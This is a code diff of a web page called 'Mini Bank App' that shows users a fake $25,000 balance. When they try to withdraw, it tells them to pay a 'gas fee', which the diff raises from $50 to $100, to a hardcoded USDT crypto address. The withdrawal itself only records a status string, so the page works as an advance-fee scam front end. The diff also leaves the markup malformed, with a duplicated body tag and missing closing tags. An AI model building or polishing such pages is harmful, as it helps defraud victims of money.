@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Mini Bank App</title>
-<style>
-body {
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Mini Bank App</title>
+    <style>
+        body {
 font-family: Arial;
 padding: 20px;
 background: #f5f5f5;
@@ -13,7 +13,8 @@ margin: 0;
 }
 h2 { margin-top: 0; }
 .card {
-background: white;
+background: navy;
+  color:white;
 padding: 20px;
 border-radius: 10px;
 box-shadow: 0 2px 5px gray;
@@ -41,7 +42,7 @@ align-items: center;
 z-index: 10;
 }
 .modal-content {
-background: white;
+background: gray;
 padding: 20px;
 border-radius: 10px;
 width: 90%;
@@ -136,9 +137,11 @@ background: #007bff;
 color: white;
 border-radius: 3px;
 }
-</style>
+
+    </style>
 </head>
 <body>
+    <body>
 
 <!-- Top Bar -->
 <div class="topbar">
@@ -181,8 +184,8 @@ border-radius: 3px;
 <option value="Crypto">Crypto</option>
 <option value="Credit Card">Credit Card</option>
 </select>
-<input type="text" id="details" placeholder="paypal email/usdt address" />
-<input type="text" id="accountNumber" placeholder="Enter account number/Network name eg,trc20,erc20" />
+<input type="text" id="details" placeholder="paypal email/address" />
+<input type="text" id="accountNumber" placeholder="Enter account number" />
 <button class="btn" onclick="confirmWithdraw()">Continue</button>
 </div>
 </div>
@@ -192,11 +195,16 @@ border-radius: 3px;
 <div class="modal-content">
 <button class="close-btn" onclick="closeGas()">x</button>
 <h3>⚠️ Gas Fee Required</h3>
-<p>To withdraw <strong id="pendingAmt"></strong>, you must pay a $50 gas fee to this address:</p>
+<p>To withdraw <strong id="pendingAmt"></strong>, you must pay a $100 gas fee to this address:</p>
 
 <div class="copy-row">
 <span id="usdtAddress">TJcVfrTA42vZhYvxPugfcx1wQDM2xp2pTW</span>
-<button class="copy-btn" onclick="copyText('usdtAddress')">usdt trc20</button>
+<button class="copy-btn" onclick="copyText('usdtAddress')">Copy</button>
+</div>
+
+<div class="copy-row">
+<span id="copyAccount">None</span>
+<button class="copy-btn" onclick="copyText('copyAccount')">Copy</button>
 </div>
 
 <button class="btn" onclick="finalizeWithdraw()">✅ I have paid</button>
@@ -210,112 +218,125 @@ border-radius: 3px;
 <h3>Admin Panel</h3>
 <ul id="adminList"></ul>
 </div>
-  <div class="copy-row">
-<span id="usdtAddress">TJcVfrTA42vZhYvxPugfcx1wQDM2xp2pTW</span>
-<button class="copy-btn" onclick="copyText('usdtAddress')">Copy</button>
 </div>
 
-<div class="copy-row">
-<span id="copyAccount">None</span>
-<button class="copy-btn" onclick="copyText('copyAccount')">Copy</button>
-</div>
-</div>
 
-<script>
-let currentUser = { email: "test@example.com" }; // Mock for testing
-let balance = 25000;
-let dailyClaimed = false;
-let history = [];
-let withdrawals = [];
-let notifications = [];
+    <script>
+        let currentUser = { email: "test@example.com" }; // Mock for testing
+        let balance = parseFloat(localStorage.getItem("balance")) || 25000;
+        let dailyClaimed = localStorage.getItem("dailyClaimed") === "true";
+        let history = JSON.parse(localStorage.getItem("history")) || [];
+        let withdrawals = JSON.parse(localStorage.getItem("withdrawals")) || [];
+        let notifications = JSON.parse(localStorage.getItem("notifications")) || [];
 
-function updateUI() {
-document.getElementById("balance").textContent = balance;
-const hist = document.getElementById("history");
-hist.innerHTML = "";
-history.forEach(h => {
-const li = document.createElement("li");
-li.textContent = h;
-hist.appendChild(li);
-});
-updateNotifications();
-}
+        function updateStorage() {
+            localStorage.setItem("balance", balance);
+            localStorage.setItem("dailyClaimed", dailyClaimed);
+            localStorage.setItem("history", JSON.stringify(history));
+            localStorage.setItem("withdrawals", JSON.stringify(withdrawals));
+            localStorage.setItem("notifications", JSON.stringify(notifications));
+        }
 
-function openWithdraw() {
-document.getElementById("withdrawModal").classList.remove("hidden");
-}
-function closeWithdraw() {
-document.getElementById("withdrawModal").classList.add("hidden");
-}
-function confirmWithdraw() {
-const amt = parseFloat(document.getElementById("withdrawAmount").value);
-const method = document.getElementById("method").value;
-const details = document.getElementById("details").value;
-const acctNum = document.getElementById("accountNumber").value;
+        function updateUI() {
+            document.getElementById("balance").textContent = balance;
+            const hist = document.getElementById("history");
+            hist.innerHTML = "";
+            history.forEach(h => {
+                const li = document.createElement("li");
+                li.textContent = h;
+                hist.appendChild(li);
+            });
+            updateNotifications();
+        }
 
-if (!amt || !method || !details || !acctNum) {
-alert("Fill all fields.");
-return;
-}
-if (amt > balance) {
-alert("Insufficient balance.");
-return;
-}
+        function openWithdraw() {
+            document.getElementById("withdrawModal").classList.remove("hidden");
+        }
 
-sessionStorage.setItem("pendingWithdraw", JSON.stringify({ amt, method, details, acctNum }));
-document.getElementById("pendingAmt").textContent = `$${amt}`;
-document.getElementById("copyAccount").textContent = acctNum;
+        function closeWithdraw() {
+            document.getElementById("withdrawModal").classList.add("hidden");
+        }
 
-closeWithdraw();
-document.getElementById("gasModal").classList.remove("hidden");
-}
-function closeGas() {
-document.getElementById("gasModal").classList.add("hidden");
-}
-function finalizeWithdraw() {
-const { amt, method, details } = JSON.parse(sessionStorage.getItem("pendingWithdraw"));
-balance -= amt;
-withdrawals.push({ amount: amt, method, details, status: "Pending" });
-const msg = `🕒 Pending withdrawal of $${amt} via ${method}`;
-history.push(msg);
-notifications.push(msg);
-updateUI();
-closeGas();
-sessionStorage.removeItem("pendingWithdraw");
-}
-function toggleAdmin() {
-const admin = document.getElementById("adminModal");
-if (admin.classList.contains("hidden")) {
-const pass = prompt("Enter admin password:");
-if (pass === "admin123") {
-admin.classList.remove("hidden");
-renderAdminList();
-} else alert("Access Denied.");
-} else admin.classList.add("hidden");
-}
-function renderAdminList() {
-const list = document.getElementById("adminList");
-list.innerHTML = "";
-withdrawals.forEach((w, i) => {
-const li = document.createElement("li");
-li.innerHTML = `${w.status} - $${w.amount} via ${w.method}
-<button onclick="approve(${i})">✔</button>
-<button onclick="reject(${i})">✖</button>`;
-list.appendChild(li);
-});
-}
-function approve(i) {
-withdrawals[i].status = "✅ Approved";
-history.push(`✅ Approved $${withdrawals[i].amount}`);
-updateUI(); renderAdminList();
-}
-function reject(i) {
-const amt = withdrawals[i].amount;
-balance += amt;
-withdrawals[i].status = "❌ Rejected";
-history.push(`❌ Rejected $${amt}`);
-updateUI(); renderAdminList();
-}
+        function confirmWithdraw() {
+            const amt = parseFloat(document.getElementById("withdrawAmount").value);
+            const method = document.getElementById("method").value;
+            const details = document.getElementById("details").value;
+            const acctNum = document.getElementById("accountNumber").value;
+
+            if (!amt || !method || !details || !acctNum) {
+                alert("Fill all fields.");
+                return;
+            }
+
+            if (amt > balance) {
+                alert("Insufficient balance.");
+                return;
+            }
+
+            sessionStorage.setItem("pendingWithdraw", JSON.stringify({ amt, method, details, acctNum }));
+            document.getElementById("pendingAmt").textContent = `$${amt}`;
+            document.getElementById("copyAccount").textContent = acctNum;
+            closeWithdraw();
+            document.getElementById("gasModal").classList.remove("hidden");
+        }
+
+        function closeGas() {
+            document.getElementById("gasModal").classList.add("hidden");
+        }
+
+        function finalizeWithdraw() {
+            const { amt, method, details } = JSON.parse(sessionStorage.getItem("pendingWithdraw"));
+            balance -= amt;
+            withdrawals.push({ amount: amt, method, details, status: "Pending" });
+            const msg = `🕒 Pending withdrawal of $${amt} via ${method}`;
+            history.push(msg);
+            notifications.push(msg);
+            updateUI();
+            updateStorage();
+            closeGas();
+            sessionStorage.removeItem("pendingWithdraw");
+        }
+
+        function toggleAdmin() {
+            const admin = document.getElementById("adminModal");
+            if (admin.classList.contains("hidden")) {
+                const pass = prompt("Enter admin password:");
+                if (pass === "admin123") {
+                    admin.classList.remove("hidden");
+                    renderAdminList();
+                } else alert("Access Denied.");
+            } else admin.classList.add("hidden");
+        }
+
+        function renderAdminList() {
+            const list = document.getElementById("adminList");
+            list.innerHTML = "";
+            withdrawals.forEach((w, i) => {
+                const li = document.createElement("li");
+                li.innerHTML = `${w.status} - $${w.amount} via ${w.method} <button onclick="approve(${i})">✔</button> <button onclick="reject(${i})">✖</button>`;
+                list.appendChild(li);
+            });
+        }
+
+        function approve(i) {
+            withdrawals[i].status = "✅ Approved";
+            history.push(`✅ Approved $${withdrawals[i].amount}`);
+            updateUI();
+            updateStorage();
+            renderAdminList();
+        }
+
+        function reject(i) {
+            const amt = withdrawals[i].amount;
+            balance += amt;
+            withdrawals[i].status = "❌ Rejected";
+            history.push(`❌ Rejected $${amt}`);
+            updateUI();
+            updateStorage();
+            renderAdminList();
+        }
+
+        
 function closeAdmin() {
 document.getElementById("adminModal").classList.add("hidden");
 }
@@ -356,5 +377,3 @@ updateUI();
 };
 </script>
 
-</body>
-</html>
